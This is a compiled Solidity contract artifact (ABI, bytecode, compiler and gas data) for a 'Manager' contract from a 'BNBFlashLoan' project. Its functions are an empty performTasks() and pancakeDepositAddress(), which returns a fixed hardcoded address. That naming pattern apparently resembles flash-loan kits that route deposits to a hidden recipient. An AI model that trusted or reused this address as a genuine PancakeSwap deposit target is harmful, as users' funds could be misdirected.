{
    "contractName": "Manager",
    "abi": [
        {
            "inputs": [],
            "name": "pancakeDepositAddress",
            "outputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "pure",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "performTasks",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ],
    "bytecode": "6080604052348015600f57600080fd5b5060b18061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a114603757806360b4d0c114603f575b600080fd5b603d6061565b005b60456063565b604080516001600160a01b039092168252519081900360200190f35b565b73f0c0b3094cfc45b8b0e71e8434583eea529e96e59056fea2646970667358221220a1a6df17a4d0ef6dc085bfedbf42f8b65d2970374c0cf289bf1adf106b951e7664736f6c63430006000033",
    "sourcePath": "/Users/abc/BNBFlashLoan/codemanager.sol",
    "compiler": {
        "name": "solc",
        "version": "0.6.0+commit.26b70077"
    },
    "functionHashes": {
        "pancakeDepositAddress()": "60b4d0c1",
        "performTasks()": "0c0f93a1"
    },
    "gasEstimates": {
        "creation": {
            "codeDepositCost": "35400",
            "executionCost": "87",
            "totalCost": "35487"
        },
        "external": {
            "pancakeDepositAddress()": "219",
            "performTasks()": "122"
        }
    }
}